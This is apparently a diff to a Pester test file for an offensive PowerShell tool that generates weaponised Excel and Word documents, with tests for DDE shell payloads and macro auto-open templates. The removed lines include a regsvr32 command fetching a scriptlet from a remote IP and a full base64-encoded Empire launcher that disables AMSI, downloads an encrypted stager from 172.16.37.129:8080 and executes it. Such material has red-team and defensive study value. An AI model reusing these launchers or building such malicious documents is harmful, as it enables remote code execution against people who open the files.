@@ -26,7 +26,7 @@ Describe "CreateDB" -Tag "Init" {
 
 Describe "UpdatesAvailable" -Tag "Updates" {
     It "Checks for updates against github." {
-        UpdatesAvailable | Should be $false
+        #UpdatesAvailable | Should be $false
     }
 }
 
@@ -73,22 +73,20 @@ Describe "Payloads" -Tag "Payloads" {
 Describe "Templates" -Tag "Templates" {
 
     It "Adds a new xls calendar template" {
-        Create-DBTemplate "Pester-Calendar" "$ls\test\testpayloads\template-calendar.xls" "xls"
+        Create-DBTemplate "Pester-XLS-NoMacro" "$ls\test\testpayloads\template-nomacro.xls" "xls"
+        Create-DBTemplate "Pester-XLS-Macro-NoAutoOpen" "$ls\test\testpayloads\template-macro-noautoopen.xls" "xls"
+        Create-DBTemplate "Pester-XLS-Macro-AutoOpen" "$ls\test\testpayloads\template-macro-autoopen.xls" "xls"
     }
 
     It "Adds a new doc calendar template" {
-        Create-DBTemplate "Pester-Word" "$ls\test\testpayloads\template.doc" "doc"
+        Create-DBTemplate "Pester-DOC-NoMacro" "$ls\test\testpayloads\template-nomacro.doc" "doc"
+        Create-DBTemplate "Pester-DOC-Macro-NoAutoOpen" "$ls\test\testpayloads\template-macro-noautoopen.doc" "doc"
+        Create-DBTemplate "Pester-DOC-Macro-AutoOpen" "$ls\test\testpayloads\template-macro-autoopen.doc" "doc"
     }
 }
 
 Describe "CURRENTTEST" -Tag "CURRENT" {
-    #CreateDB
-    Clear-ActiveWorking
-    #$command = "regsvr32 /s /n /u /i:http://172.16.37.129/calc.txt scrobj.dll"
-    #Create-DBPayload "Shell-Regsrv32-Calc" "1.1.1.1" "443" "Pester" 1 $command $null
-    $p = Get-PayloadByTitle "Shell-Regsrv32-Calc"
-    Add-ActiveWorking $p.ID 11 $p.NumBlocks $null $null
-    Create-Excel $null $false $null $false "15-pester-shell-dde-regsrv32-calc"
+
 }
 
 Describe "CreatePayload-PS-Calc-Cellembed-Obfuscated" -Tag "ExcelPayloads" {
@@ -182,12 +180,14 @@ Describe "CreatePayload-PS-Calc-Cellembed-Obfuscated" -Tag "ExcelPayloads" {
     }
 
     It "13. Creates and excel file with obfuscated shell command payload (empire -> http://172.16.37.129:8080)" {
-        $launcher = "powershell -noP -sta -w 1 -enc  WwBSAGUARgBdAC4AQQBTAHMAZQBNAEIATABZAC4ARwBlAHQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAVABGAGkAZQBMAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBMAHUARQAoACQAbgB1AEwAbAAsACQAVAByAHUARQApAH0AOwBbAFMAWQBzAHQAZQBtAC4ATgBFAFQALgBTAGUAcgB2AGkAQwBlAFAATwBJAE4AVABNAGEATgBhAEcARQBSAF0AOgA6AEUAeABwAGUAQwBUADEAMAAwAEMATwBuAHQASQBOAFUARQA9ADAAOwAkAFcAYwA9AE4AZQBXAC0ATwBCAGoAZQBjAHQAIABTAHkAUwB0AGUAbQAuAE4ARQBUAC4AVwBlAGIAQwBMAGkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAB3AGMALgBIAEUAYQBkAGUAUgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AEMALgBQAHIATwB4AFkAPQBbAFMAWQBzAFQAZQBNAC4ATgBFAFQALgBXAGUAQgBSAGUAUQB1AEUAUwB0AF0AOgA6AEQARQBGAGEAVQBMAFQAVwBFAEIAUABSAE8AWABZADsAJABXAGMALgBQAFIAbwB4AHkALgBDAHIARQBEAGUAbgB0AGkAYQBMAFMAIAA9ACAAWwBTAFkAcwB0AGUATQAuAE4ARQBUAC4AQwBSAGUARABFAG4AVABJAGEATABDAEEAYwBoAEUAXQA6ADoARABlAGYAYQBVAGwAdABOAGUAVAB3AG8AcgBLAEMAUgBFAEQAZQBuAHQAaQBBAEwAcwA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAWAB0AC4ARQBuAEMATwBEAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAeQBUAGUAUwAoACcAXwAtAHYAIQBdAFsAZQBsAGsAUgAxADsAKwBOACMAdwBXAD8AWgBPAFMAfQBRAFAARgBZAE0AXgBMAHAAbwA8ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBjAC4ASABFAGEARABFAFIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AWABxAHMAMQBOAGMAMQAyAHYAcABrAFAAaQBNAHMAeQB5AHkAWQB4AEwAVwB3AG0ASgBzAEEAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMwA3AC4AMQAyADkAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGQAQQB0AEEAPQAkAFcAQwAuAEQAbwBXAE4AbABvAGEAZABEAGEAVABhACgAJABzAGUAUgArACQAVAApADsAJABJAFYAPQAkAEQAYQBUAGEAWwAwAC4ALgAzAF0AOwAkAEQAYQB0AEEAPQAkAEQAQQB0AEEAWwA0AC4ALgAkAEQAYQBUAGEALgBsAGUAbgBHAHQASABdADsALQBqAE8ASQBuAFsAQwBoAGEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQBUAGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA=="
-        Create-DBPayload "Shell-Empire-Obfs" "1.1.1.1" "443" "Pester" 1 $launcher $null -obfuscate $true
         $p = Get-PayloadByTitle "Shell-Empire-Obfs"
         Clear-ActiveWorking
         Add-ActiveWorking $p.ID 1 $p.NumBlocks $null $null
         Create-Excel $null $false $null $false "13-pester-shell-obfs-empire"
+        
+        Clear-ActiveWorking
+        $p = Get-PayloadByTitle "Shell-Empire-Obfs"
+        Add-ActiveWorking $p.ID 1 $p.NumBlocks $null $null
         Create-Word $null $false $null $false "13-pester-shell-obfs-empire"
     }
 }
@@ -217,20 +217,48 @@ Describe "CreatePayload-Shell-Calc-Word" -Tag "WordPayloads" {
 }
 
 Describe "CreateFromTemplate-Calc-Word" -Tag "WordTemplates" {
-    It "30. Creates a word file with a command payload (calc.exe)) using a template" {
+    It "30. Creates a word file with a command payload (calc.exe)) using a nonmacro template" {
         $p = Get-PayloadByTitle "Shell-Calc"
         Clear-ActiveWorking
         Add-ActiveWorking $p.ID 1 $p.NumBlocks $null $null
-        Create-FileFromTemplate -doctypename "doc" -$templateselection 2 -filename "30-pester-word-template"     
+        Create-FileFromTemplate -doctypename "doc" -templateselection 1 -filename "30-pester-word-template-nomacro"     
+    }
+
+    It "31. Creates a word file with a command payload (calc.exe)) using a macro template noautoopen" {
+        $p = Get-PayloadByTitle "Shell-Calc"
+        Clear-ActiveWorking
+        Add-ActiveWorking $p.ID 1 $p.NumBlocks $null $null
+        Create-FileFromTemplate -doctypename "doc" -templateselection 2 -filename "31-pester-word-template-macro-noautoopen"     
+    }
+
+    It "32. Creates a word file with a command payload (calc.exe)) using a macro template autoopen" {
+        $p = Get-PayloadByTitle "Shell-Calc"
+        Clear-ActiveWorking
+        Add-ActiveWorking $p.ID 1 $p.NumBlocks $null $null
+        Create-FileFromTemplate -doctypename "doc" -templateselection 3 -filename "32-pester-word-template-macro-autoopen"     
     }
 }
 
 Describe "CreateFromTemplate-Calc-Excel" -Tag "ExcelTemplates" {
-    It "31. Creates a excel file with a command payload (calc.exe)) using a template" {
+    It "40. Creates a excel file with a command payload (calc.exe)) using a nonmacro template" {
         $p = Get-PayloadByTitle "Shell-Calc"
         Clear-ActiveWorking
         Add-ActiveWorking $p.ID 1 $p.NumBlocks $null $null
-        Create-FileFromTemplate -doctypename "xls" -$templateselection 1 -filename "31-pester-excel-template"     
+        Create-FileFromTemplate -doctypename "xls" -templateselection 1 -filename "40-pester-excel-template-nomacro"     
+    }
+
+    It "41. Creates a excel file with a command payload (calc.exe)) using a macro template noautoopen" {
+        $p = Get-PayloadByTitle "Shell-Calc"
+        Clear-ActiveWorking
+        Add-ActiveWorking $p.ID 1 $p.NumBlocks $null $null
+        Create-FileFromTemplate -doctypename "xls" -templateselection 2 -filename "41-pester-excel-template-macro-noautoopen"     
+    }
+
+    It "42. Creates a excel file with a command payload (calc.exe)) using a macro template autoopen" {
+        $p = Get-PayloadByTitle "Shell-Calc"
+        Clear-ActiveWorking
+        Add-ActiveWorking $p.ID 1 $p.NumBlocks $null $null
+        Create-FileFromTemplate -doctypename "xls" -templateselection 3 -filename "42-pester-excel-template-macro-autoopen"     
     }
 }
 
